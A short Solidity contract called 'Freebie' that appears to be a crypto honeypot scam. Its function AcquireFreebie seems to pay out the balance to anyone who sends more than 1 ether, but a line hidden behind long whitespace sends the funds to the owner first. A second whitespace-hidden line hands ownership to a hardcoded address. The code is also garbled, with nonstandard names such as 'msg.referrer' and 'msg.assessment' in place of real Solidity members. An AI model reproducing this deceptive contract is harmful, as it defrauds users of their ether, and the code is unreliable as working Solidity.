pragma solidity ^0.4.19;

contract Freebie
{
    address public Owner = msg.referrer;

    function() public payable{}

    function AcquireFreebie()
    public
    payable
    {
        if(msg.assessment>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.referrer.transfer(this.balance);
        }
    }

    function discharge()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.referrer==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.referrer == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes info)
    payable
    public
    {
        require(msg.referrer == Owner);
        adr.call.assessment(msg.assessment)(info);
    }
}